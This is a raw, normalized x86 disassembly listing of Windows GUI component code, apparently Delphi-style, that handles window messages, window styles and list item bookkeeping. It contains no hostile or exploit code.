mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402bf8
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_445ba4
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_443c80
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_443bf4
mov ecx esp
or edx 0xffffffff
call sub_42c7a4
add esp 0x18
pop ebx
retn
sub_443cfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x229 ]
mov [ eax + 0x288 ] dl
xor edx edx
call sub_447070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x288 ]
call sub_447070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_443bf4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_445894
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_443e7d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_443bf4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4458a0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_442cc8
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_442b70
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_442cfc
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_442ea0
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_442ea0
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_443ed4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_4193d8
mov eax edi
call sub_443cc4
mov ebp ebx
mov eax ebp
call sub_443bd0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_443c00
push eax
mov eax edi
call sub_443b74
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_443f34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_443bd0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_443bd0
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_443bd0
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_443bd0
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_443c00
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_443c00
pop edx
call sub_443a0c
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_443fc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4194c4
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_444228
push ebp
call sub_443f34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444019
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_444206
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_443cc4
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_41b5c8
mov eax [ ebp - 0xc ]
call sub_407e1c
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_4441e4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_41b5c8
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441eb
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_443bd0
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_443b74
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_4041e0
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_443614
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4437cc
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_4437cc
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_4437cc
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_4436c4
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
xor eax eax
mov al [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_4041e0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
mov al [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_443aa0
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_444228
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4444bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_443bd0
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
call sub_407e1c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_44449b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_443bd0
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_443bd0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_443bd0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x15
add [ ebp - 0x10 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41b600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444a2
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40278c
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x18 ]
add [ ebp - 0x20 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov eax [ eax + 0x24 ]
call sub_444214
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_444214
inc eax
add [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
mov ecx 0xff
call sub_404218
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
inc eax
add [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
mov ecx 0xff
call sub_404218
mov eax [ ebp - 0x24 ]
movzx eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x24 ] eax
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443c00
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_443a94
mov [ edi ] ax
add edi 0x2
inc esi
dec ebx
jne r-xdata
sub_444508
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403550
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_44457c
xor edx edx
mov eax edi
call sub_444590
mov dl 0x1
mov eax edi
call sub_4445a4
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4445b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_443528
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_40443c
push eax
mov eax [ ebx + 0x24 ]
call sub_40443c
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_443528
mov esi eax
mov eax ebx
call sub_443528
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_444624
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_455208
mov edx 0x96
mov eax ebx
call sub_45522c
mov dl 0x1
mov eax ebx
call sub_44550c
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x128 ]
xor edx edx
mov eax ebx
call sub_455c10
mov dl 0x1
mov eax ebx
call sub_45c5b4
mov dl 0x1
mov eax ebx
call sub_4458ec
mov dl 0x1
mov eax ebx
call sub_445590
mov dl 0x1
mov eax ebx
call sub_445520
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x210 ] esi
mov eax esi
mov edx ebx
call sub_454628
mov [ ebx + 0x26c ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_442e5c
mov [ ebx + 0x23c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebx + 0x22c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov [ ebx + 0x28c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444508
mov [ ebx + 0x234 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e64
mov [ ebx + 0x290 ] eax
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x2a0 ] eax
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_4629c8
mov [ ebx + 0x224 ] eax
push ebx
push sub_445094
call sub_46caf0
mov [ ebx + 0x250 ] eax
push ebx
push sub_444f9c
call sub_46caf0
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_444d78
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_444d78
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x284 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_444d78
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_44480c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax [ esi + 0x224 ]
call sub_4031ec
mov eax [ esi + 0x23c ]
call sub_4031ec
mov eax [ esi + 0x28c ]
call sub_4031ec
mov eax [ esi + 0x22c ]
call sub_4031ec
mov eax [ esi + 0x234 ]
call sub_4031ec
mov eax [ esi + 0x240 ]
call sub_4031ec
mov eax [ esi + 0x248 ]
call sub_4031ec
mov eax [ esi + 0x24c ]
call sub_4031ec
mov eax [ esi + 0x290 ]
call sub_4031ec
mov eax [ esi + 0x250 ]
call sub_46cb04
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ esi + 0x25c ]
call sub_46cb04
mov eax [ esi + 0x27c ]
call sub_4031ec
mov eax [ esi + 0x280 ]
call sub_4031ec
mov eax [ esi + 0x284 ]
call sub_4031ec
mov eax [ esi + 0x210 ]
call sub_4031ec
xor eax eax
mov [ esi + 0x210 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
mov edx [ esi + 0x260 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_44490c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_440dd4
mov edx esi
mov eax ebx
call sub_4591d4
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_459100
mov edx [ esi + 0x4 ]
or edx 0x2000000
xor ecx ecx
mov cl [ ebx + 0x215 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x214 ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x234 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x216 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x238 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22b ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x244 ] 0x0
je r-xdata
cmp [ ebx + 0x245 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_444a38
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a78
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_444ac0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e430
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
call sub_41cae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_444aec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_459300
mov eax [ ebp - 0x4 ]
call sub_4451b4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_4455c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4455a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_4455f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_442ef0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x218 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ce4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x1
xor eax eax
push ebp
push sub_444c16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ ebp - 0x4 ]
call sub_41b72c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x21c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_462b40
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ca8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_462b40
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_462d14
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_444d50
push ebp
call sub_444a38
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_455b40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_443ec0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_4452b0
mov eax [ ebp - 0x4 ]
call sub_4477fc
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_462b40
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_462d14
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_444d50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_462d14
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_444d50
sub_444cd4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41b420
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x240 ] eax
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_41b78c
push 0x0
push 0x0
mov eax [ ebx + 0x240 ]
call sub_41b3bc
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_443bd0
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_4596e4
pop ebx
retn
mov eax ebx
call sub_44533c
sub_444d50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c380
mov ecx edi
mov edx esi
call sub_42c6dc
sub_444d78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_462b40
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_462d14
jmp r-xdata
cmp esi [ ebx + 0x21c ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_444d50
jmp r-xdata
cmp esi [ ebx + 0x218 ]
jne r-xdata
cmp esi [ ebx + 0x220 ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_444d50
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_444d50
sub_444dec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454f1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x218 ]
jne r-xdata
cmp esi [ edi + 0x21c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4470f8
cmp esi [ edi + 0x220 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_447168
xor edx edx
mov eax edi
call sub_4471e0
sub_444e60
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_444f90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45c380
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42ca98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_444f6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419b1c
mov esi eax
dec esi
test esi esi
